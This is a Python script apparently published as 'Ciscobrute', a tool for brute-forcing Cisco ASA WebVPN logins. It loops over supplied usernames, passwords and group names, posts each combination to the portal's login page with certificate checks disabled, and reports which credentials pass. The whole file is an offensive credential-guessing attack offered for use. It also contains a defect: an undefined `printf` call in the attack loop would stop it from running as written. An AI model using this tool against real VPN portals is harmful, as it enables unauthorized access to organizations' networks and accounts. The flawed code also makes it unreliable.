import os
import sys 
import time
import requests
import argparse
import validators
from urllib.parse import urlparse
from colorama import Fore, Back, Style
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    	print(f"""
{Fore.BLUE}## 		  Ciscobrute 			 ##
{Fore.BLUE}##	Cisco ASA VPN Bruteforcing Tool		 ##
{Fore.BLUE}## 		Version: 0.0.1 			 ##
          """)

def args_banner(target, usernames, passwords, groups):
    	print(f"""
{Fore.BLUE}> {Fore.GREEN}[*]{Fore.YELLOW} Target: {Style.RESET_ALL}{target} 
{Fore.BLUE}> {Fore.GREEN}[*]{Fore.YELLOW} Usernames: {Style.RESET_ALL}{usernames}
{Fore.BLUE}> {Fore.GREEN}[*]{Fore.YELLOW} Passwords: {Style.RESET_ALL}{passwords}
{Fore.BLUE}> {Fore.GREEN}[*]{Fore.YELLOW} Groups: {Style.RESET_ALL}{groups}
{Fore.BLUE}> {Fore.YELLOW}[*]{Fore.YELLOW} Attack started:""")
	

def init_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("-t", help="Target, example: vpn.domain.com", action='store', required=True)
	parser.add_argument("-u", help="Username or file containing usernames", action='store', required=True)
	parser.add_argument("-p", help="Password or file containing passwords", action='store', required=True)
	parser.add_argument("-g", help="Group name or file containing group names", action='store', required=True)            
	parser.add_argument("-r", help="Rate of requests", action='store', choices=range(0, 10), type=int, default=0)                                     
	return parser
	
	
def parse_args(parser):
	args = parser.parse_args()	
	
	target = check_target(args.t)
	usernames = parse_users(args.u)
	passwords = parse_passwords(args.p)
	groups = parse_groups(args.g)
	rate = args.r
	
	args_banner(args.t, args.u, args.p, args.g)
	return target, usernames, passwords, groups, rate

def check_target(target):
	url = ""
	if validators.url(target):
		check =  urlparse(target)		
		url = f"https://{check.hostname}/+webvpn+/index.html"
	else:
		url =  f"https://{target}/+webvpn+/index.html"
	return url	
	
def parse_users(usernames):
	check_file = os.path.isfile(usernames)
	check_dir = os.path.exists(usernames)
	user_list = []
	
	if not check_file and not check_dir:
		user_list.append(usernames)
	elif check_file:
		with open(usernames) as f:
			user_list = [line.rstrip() for line in f]
	else:
		sys.exit(f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} <Usernames> Error:{Style.RESET_ALL} {usernames} is a directory.")
	
	return user_list	
		
def parse_passwords(passwords):
	check_file = os.path.isfile(passwords)
	check_dir = os.path.exists(passwords)
	password_list = []
	
	if not check_file and not check_dir:
		password_list.append(passwords)
	elif check_file:
		with open(passwords) as f:
			password_list = [line.rstrip() for line in f]
	else:
		sys.exit(f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} <Passwords> Error:{Style.RESET_ALL} {passwords} is a directory.")
		
	return password_list
	
def parse_groups(groups):
	check_file = os.path.isfile(groups)
	check_dir = os.path.exists(groups)
	group_list = []
	
	if not check_file and not check_dir:
		group_list.append(groups)
	elif check_file:
		with open(groups) as f:
			group_list = [line.rstrip() for line in f]
	else:
		sys.exit(f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} <Groups> Error:{Style.RESET_ALL} {groups} is a directory.")
		
	return group_list

def attack(target, usernames, passwords, groups, rate):
	cookies = {"webvpnlogin":"1", "webvpnLang":"en"}
	timeout = 0.5
	if rate != 0:
		timeout = rate

	for group in groups:
		printf("{Fore.BLUE}> {Fore.YELLOW}[*]{Fore.YELLOW} Group: {group}")
		for password in passwords:
			for username in usernames:
				data = f"tgroup=&next=&tgcookieset=&group_list={group}&username={username}&password={password}&Login=Login"
				r = requests.post(url=target, cookies=cookies, data=data, verify=False)
				validate_login(username, password, r)
				time.sleep(timeout)

	return 0
	
def validate_login(username, password, request):
	if "document.location.replace" in request.text:
		print(f"{Fore.BLUE}> {Fore.RED}[-]{Fore.RED} Failed:{Style.RESET_ALL} {username}:{password}")
	else:
		print(f"{Fore.BLUE}> {Fore.CYAN}[+]{Fore.GREEN} Passed:{Style.RESET_ALL} {username}:{password}")
	return 0
	
if __name__ == '__main__':
	banner()
	parser = init_args()
	target, usernames, passwords, groups, rate = parse_args(parser)
	attack(target, usernames, passwords, groups, rate)
	
